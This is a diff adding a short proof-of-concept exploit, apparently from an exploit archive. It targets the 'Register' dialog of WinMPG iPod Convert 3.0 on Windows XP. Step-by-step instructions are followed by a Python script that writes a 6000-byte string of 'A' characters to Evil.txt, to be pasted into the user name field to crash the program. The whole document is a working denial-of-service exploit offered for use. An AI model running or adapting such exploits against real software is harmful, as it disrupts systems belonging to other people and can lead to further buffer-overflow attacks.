@@ -1,0 +1,26 @@
+# Exploit Title: WinMPG iPod Convert 3.0 - 'Register' Denial of Service
+# Date: 2019-07-16
+# Vendor Homepage:http://www.winmpg.com
+# Software Link:  https://www.techspot.com/downloads/downloadnow/6192/?evp=d62142990e9320a4e811b283fdcc4060&file=
+# Exploit Author: stresser
+# Tested Version: 3.0
+# Tested on: Windows XP SP3 EN
+
+
+# 1.- Run python code :WinMPG.py
+# 2.- Open EVIL.txt and copy content to clipboard
+# 3.- Open WinMPG and Click 'Register'
+# 4.- Paste the content of EVIL.txt into the Field: 'User Name and User Code'
+# 5.- Click 'Ok'and you will see a crash.
+
+#!/usr/bin/env python
+buffer = "\x41" * 6000
+
+try:
+	f=open("Evil.txt","w")
+	print "[+] Creating %s bytes evil payload.." %len(buffer)
+	f.write(buffer)
+	f.close()
+	print "[+] File created!"
+except:
+	print "File cannot be created"
